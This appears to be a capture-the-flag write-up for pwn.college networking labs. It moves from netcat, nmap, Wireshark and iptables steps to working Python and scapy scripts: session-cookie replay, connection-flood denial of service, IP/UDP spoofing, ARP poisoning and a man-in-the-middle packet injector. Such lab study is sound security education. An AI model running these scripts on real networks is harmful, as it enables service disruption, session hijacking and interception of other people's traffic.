# Connect

> From your host at 10.0.0.1, connect to the remote host at 10.0.0.2 on port 31337.

`/challenge/run`, `nc 10.0.0.2 31337`

# Send

> From your host at 10.0.0.1, connect to the remote host at 10.0.0.2 on port 31337, and send the message: Hello, World!.

`printf "Hello, World!\n" | nc 10.0.0.2 31337`

# Shutdown

> From your host at 10.0.0.1, connect to the remote host at 10.0.0.2 on port 31337, and then shutdown the connection.

`nc 10.0.0.2 31337 -N`, then press `Ctrl+D`.

# Listen

`nc $ip $port -lN`

# Scan 1

> From your host at 10.0.0.1, connect to some unknown remote host on the 10.0.0.0/24 subnet, on port 31337.

There's `There's unknown_ip = f"10.0.0.{random.randint(10, 254)}"` in the `/challenge/run`.

```bash scan1.bash
i=0
for i in $(seq 10 214); do
    timeout 0.2 ping -c 1 10.0.0.$i  # we know the server is at the same 
    if [ $? -eq 0 ]; then break; fi  # machine, so the timeout can be small.
done
nc 10.0.0.$i 31337 -N
```

# Scan 2

> From your host at 10.0.0.1, connect to some unknown remote host on the 10.0.0.0/16 subnet, on port 31337.

`nmap -vv -n 10.0.0.0/16 -sn --min-parallelism 200 > res.log`, `grep -B 1 "Host is up" res.log`

# Monitor 1

It seems I can't open wireshark at workspace. So I use Desktop.
After run `/challenge/run`, input `wireshark` to open GUI.
Choose eth0 to capture. Flag is at the reply packet of `10.0.0.1` with sign of `PSH, ACK`.
See the detial of the packet to find it.

# Monitor 2

The flag is split to multiple packages, and each package only has one letter.

Find a `FIN` signal to get the first letter of the flag.

# Sniffing Cookies

Read the code of `/challenge/run`.

The code `app.secret_key = os.urandom(8)` will let the session saving info in secret code in Cookie.

But the below code in `/challenge/run` exposed the cookie:

```py
assert s.post("http://10.0.0.2/login", data={"username":"admin", "password":admin_pw}).status_code == 200
    while True:
        try:
            s.get("http://10.0.0.2/ping")
```

The `assert` statement will keep the cookie in session so we can use wireshark to get the cookie in the `GET` method.

Use the cookie to get the flag.

```py
'''
GET /ping HTTP/1.1
Host: 10.0.0.2
User-Agent: python-requests/2.32.3
Accept-Encoding: gzip, deflate, zstd
Accept: */*
Connection: keep-alive
Cookie: session=eyJ1c2VyIjoiYWRtaW4ifQ.Z8fxdg.SqnIG1SqCcck6rid4_i9Fk75JTw
'''

import requests as req

url='http://10.0.0.2/flag'
head = dict(
    Cookie='session=eyJ1c2VyIjoiYWRtaW4ifQ.Z8fxdg.SqnIG1SqCcck6rid4_i9Fk75JTw',
)

sess = req.Session()
res = sess.get(url, headers=head)
print(res.text)
```

# Network Configuration

It takes me some time to search online.

```
root@ip-10-0-0-1:~/intercepting_communication# ip addr show eth0
3: eth0@if4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether da:e2:a3:1b:f2:c7 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.0.0.1/24 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::d8e2:a3ff:fe1b:f2c7/64 scope link proto kernel_ll
       valid_lft forever preferred_lft forever
root@ip-10-0-0-1:~/intercepting_communication# ip addr add 10.0.0.3 dev eth0
root@ip-10-0-0-1:~/intercepting_communication# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host proto kernel_lo
       valid_lft forever preferred_lft forever
3: eth0@if4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether da:e2:a3:1b:f2:c7 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.0.0.1/24 scope global eth0
       valid_lft forever preferred_lft forever
    inet 10.0.0.3/24 scope global secondary eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::d8e2:a3ff:fe1b:f2c7/64 scope link proto kernel_ll
       valid_lft forever preferred_lft forever
root@ip-10-0-0-1:~/intercepting_communication# nc 10.0.0.3 31337 -lN
pwn.college{flag-here}
```

# Firewall 1

> Your host at 10.0.0.1 is receiving traffic on port 31337; block that traffic.

`iptables -P INPUT DROP`

# Firewall 2

> Your host at 10.0.0.1 is receiving traffic on port 31337; block that traffic, but only from the remote host at 10.0.0.3, you must allow traffic from the remote host at 10.0.0.2.

`iptables -A INPUT -s 10.0.0.3 -j DROP`

# Firewall 3

> From your host at 10.0.0.1, connect to the remote host at 10.0.0.2 on port 31337. This time, you are currently blocking outbound traffic to port 31337.

```sh
root@ip-10-0-0-1:~/intercepting_communication# iptables -L
Chain INPUT (policy ACCEPT)
target     prot opt source               destination

Chain FORWARD (policy ACCEPT)
target     prot opt source               destination

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination
DROP       tcp  --  anywhere             anywhere             tcp dpt:31337
root@ip-10-0-0-1:~/intercepting_communication# iptables -D OUTPUT 1
root@ip-10-0-0-1:~/intercepting_communication# iptables -L
Chain INPUT (policy ACCEPT)
target     prot opt source               destination

Chain FORWARD (policy ACCEPT)
target     prot opt source               destination

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination
root@ip-10-0-0-1:~/intercepting_communication# nc 10.0.0.2 31337 -N
pwn.college{flag_here}
```

# Denial of Service 1,2

We can't use `ping`. But it's not difficult to write python script to do DoS attack.

```py
import concurrent.futures
import socket

def attack(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, 31337))
    s.send(("GET / HTTP/1.1\r\n").encode())
    s.send(("Host: " + ip + "\r\n\r\n").encode())
    s.close()

def worker(index):
    attack("10.0.0.2", 31337)

with concurrent.futures.ProcessPoolExecutor(max_workers=100) as executor:
    futures = [executor.submit(worker, i) for i in range(2049)]

concurrent.futures.wait(futures)
```

# Denial of Service 3

At least I waited for 3 min for this challenge.

```py
import concurrent.futures
import socket

def attack(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, 31337))
    return s

def worker(index):
    while True:
        ss.append(attack("10.0.0.2", 31337))

global ss
ss = []

with concurrent.futures.ProcessPoolExecutor(max_workers=500) as executor:
    futures = [executor.submit(worker, i) for i in range(2049)]

concurrent.futures.wait(futures)
```

# Ethernet

Run `/challenge/run` first.

```py
from scapy.all import *
# the source mac addr and iface is got by `ip link`
eth = Ether(dst="ff:ff:ff:ff:ff:ff", src="b6:6f:c4:08:35:9d", type=0xffff)
pkt = eth / "Hello, Ethernet!"
sendp(pkt, iface="eth0")
```

# IP

Run `/challenge/run` first.

```py
from scapy.all import *
send(IP(dst='10.0.0.2', proto=0xff))
```

# TCP

Run `/challenge/run` first.

```py
from scapy.all import *
pkt = IP(dst='10.0.0.2')/TCP(sport=31337, dport=31337, seq=31337, ack=31337, flags='APRSF')
send(pkt)
```

# TCP Handshake

> Complete TCP handshake as a client host.

This writeup is complicated and kind of verbose.  
But I'm exhausted to make a simpler one after complete the below one by reading the unfriendly doc.

```py
"""
https://scapy.readthedocs.io/en/latest/advanced_usage.html#real-example
"""

from scapy.all import *
from scapy.automaton import Automaton, ATMT

class TCP_handshake(Automaton):
    def parse_args(self, dst, sport, dport, seq, **kargs):
        Automaton.parse_args(self, **kargs)
        self.dst = dst
        # self.src =
        self.sport = sport
        self.dport = dport
        self.seq = seq
    
    @ATMT.state(initial=1)
    def begin(self):
        pass
    
    @ATMT.condition(begin)
    def send_synack(self):
        pkt = IP(dst=self.dst)/TCP(sport=self.sport, dport=self.dport, seq=self.seq, flags="S")
        send(pkt)
        raise self.wait_synack()

    @ATMT.state()
    def wait_synack(self):
        sniff(
              count=1,
              prn=self.handle_synack,
              filter=f'tcp port {self.sport} and src host {self.dst}', # it's BPF
              iface='eth0',
            #   timeout=
             )
        raise self.end()

    def handle_synack(self, packet):
        print(packet)
        pkt_ack = IP(dst=self.dst)/ \
                TCP(sport=self.sport,
                    dport=self.dport,
                    seq=packet["TCP"].ack,
                    ack=packet["TCP"].seq + 1, # or plus payload size
                    flags="A")
        send(pkt_ack)

    @ATMT.state(final=1)
    def end(self):
        pass

tcp_client = TCP_handshake('10.0.0.2', 31337, 31337, 31337)
tcp_client.run()
tcp_client.stop()
```

# UDP

Just send a UDP packet to where is required in `/challenge/run`.

```py udp.py
import socket

cli = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
cli.sendto(b"Hello, World!\n", ('10.0.0.2', 31337))

print(cli.recv(1024).decode())
```

`echo 'python ./udp.py' | /challenge/run`

# UDP 2

```py udp2.py
import socket

cli = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
cli.bind(("0.0.0.0", 31338))
cli.sendto(b"Hello, World!\n", ('10.0.0.2', 31337))

print(cli.recv(1024).decode())
```

`echo 'python ./udp2.py' | /challenge/run`

# UDP Spoofing 1

The client program in `10.0.0.2` is communicating with server `10.0.0.3`.

```py udpspoofing1.py
import socket

server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
server.bind(("0.0.0.0", 31337))

while True:
    server.sendto(b"FLAG", ('10.0.0.2', 31338))
```

Remember to press `ctrl+c` to stop it.

# UDP Spoofing 2

The client depend on the content in the message received to send its messages.

```py udpspoofing2.py
import socket
from threading import Thread

server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
server.bind(("0.0.0.0", 31337))

def send_udp():
    while True:
        server.sendto(b"FLAG:10.0.0.1:31337", ('10.0.0.2', 31338))

def recv_udp():
    flag = server.recv(1024).decode()
    print(flag)
    import os
    os._exit(0)

sending = Thread(target=send_udp)
receiving = Thread(target=recv_udp)

sending.start()
receiving.start()
```

# UDP Spoofing 3

We don't know the client UDP port.

I tried to use wireshark or nmap to detect the port of the client UDP port, but failed.

```py udpspoofing3.py
import socket
from threading import Thread
from os import _exit

serv_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
serv_sock.bind(('0.0.0.0', 31337))

def send_resp():
    while True:
        for cli_port in range(1000, 65535):
            serv_sock.sendto(b'FLAG:10.0.0.1:31337', ('10.0.0.2', cli_port))

def recv_flag():
    flag = serv_sock.recv(1024).decode()
    print(flag)
    _exit(0)

send_thr = Thread(target=send_resp)
recv_thr = Thread(target=recv_flag)

send_thr.start()
recv_thr.start()
```

# UDP Spoofing 4

The client check if the IP is true. But we can use scapy to forge the IP packet.  
There is another question that scapy is very slow to send 60 thousand of packets. But using multithreading can solve the problem.

```py udpspoofing4.py
from scapy.all import *
import socket
from threading import Thread
from os import _exit

listen_ip = '0.0.0.0'
listen_port = 9999

src_ip = '10.0.0.3'
src_port = 31337

dst_ip = '10.0.0.2'

def process_bar(start, end, now):
    rate = (now-start) / (end-start)
    print(f"\r|{'#'*round(50*rate):50}| {1+now-start}/{end-start}", end='')

def try_send(start_port, end_port):
    while True:
        for try_port in range(start_port, end_port):
            pkt = IP(src=src_ip, dst=dst_ip)/ \
                  UDP(sport=src_port, dport=try_port)/ \
                  f"FLAG:10.0.0.1:{listen_port}".encode()
            send(pkt, verbose=0)

def recv():
    serv_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    serv_sock.bind((listen_ip, listen_port))
    while True:
        print(serv_sock.recv(1024).decode())
        _exit(0)

# Linux temp port range
start_port = 32768
end_port = 60999
port_interval = 100

threads = []
# for try_port in range(32700, 61000):
st, ed = start_port // port_interval, end_port // port_interval
for i in range(st, ed+1):
    process_bar(st, ed, i); print(f', port {i*port_interval} to {(i+1)*port_interval}', end='')
    thr = Thread(target=try_send, args=[i*100, (i+1)*100])
    thr.start()
    threads.append(thr)
print('\nwait collision...')

recv_thr = Thread(target=recv)
recv_thr.start()
```

The above codes cost about two minute to get the flag.

# ARP

```py arp.py
from scapy.all import *

pkt = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst='10.0.0.2', psrc='10.0.0.42', hwsrc='42:42:42:42:42:42', op=2)
sendp(pkt, iface='eth0')
```

# Intercept

There is a client(`10.0.0.2`) is sending flag to server(`10.0.0.3`) by TCP.

First make a fake IP `10.0.0.3` by `ip addr add 10.0.0.3 dev eth0`. Actually, it is `10.0.0.3/32` other than `10.0.0.3/24`.

Then use ARP poisoning to let client send the flag to me.

```py intercept.py
from scapy.all import *
from threading import Thread
import socket
from os import _exit

def send_arp():
    sendp(
        # let the client 10.0.0.2 believe that 10.0.0.3 is at my mac.
        # the mac address is got by `ip addr`
        Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst='10.0.0.2', psrc='10.0.0.3', hwsrc='6a:e6:98:1d:67:d0', op=2),
        iface='eth0'
    )

def recv_flag():
    sock = socket.socket()
    sock.bind(('0.0.0.0', 31337))
    sock.listen()
    while True:
        try:
            connection, _ = sock.accept()
            msg = connection.recv(1024)
            print(msg.decode())
            _exit(0)
        except ConnectionError:
            continue

send_thr = Thread(target=send_arp)
recv_thr = Thread(target=recv_flag)

send_thr.start()
recv_thr.start()
```

# Man-in-the-Middle

There is another way to do use `op=1` for ARP poisoning.

```py maninthemiddle.py
from scapy.all import *
from os import _exit

BROADCAST = 'ff:ff:ff:ff:ff:ff'
MY_MAC = get_if_hwaddr('eth0')

cli_ip = '10.0.0.2'
ser_ip = '10.0.0.3'

def arp_poisoning(src, dst, forge_mac):
    sendp(
        Ether(dst=BROADCAST, src=MY_MAC) /
            ARP(pdst=dst, psrc=src, hwsrc=forge_mac, op=1),
        iface='eth0'
    )

def recv_in_middle(pkt):
    if 'TCP' in pkt and 'Raw' in pkt:
        payload = pkt[Raw].load
        print(f'\nfrom {pkt[IP].src} to {pkt[IP].dst}')
        print(f'seq {pkt[TCP].seq}, ack {pkt[TCP].ack}')
        print(payload)
        if b'pwn' in payload:
            print(payload.decode())
            _exit(0)
        if pkt[IP].src == ser_ip and b'command' in payload:
            ip = IP(src=cli_ip, dst=ser_ip)
            tcp = pkt[TCP].copy()
            del tcp[Raw]
            tcp.sport, tcp.dport = pkt[TCP].dport, pkt[TCP].sport
            tcp.seq, tcp.ack = pkt[TCP].ack, pkt[TCP].seq+len(payload)
            tcp.chksum = None
            send(
                ip / tcp / b'flag',
                iface='eth0')
        

arp_poisoning(cli_ip, ser_ip, MY_MAC),
arp_poisoning(ser_ip, cli_ip, MY_MAC)

sniff(prn=recv_in_middle, iface='eth0')
```
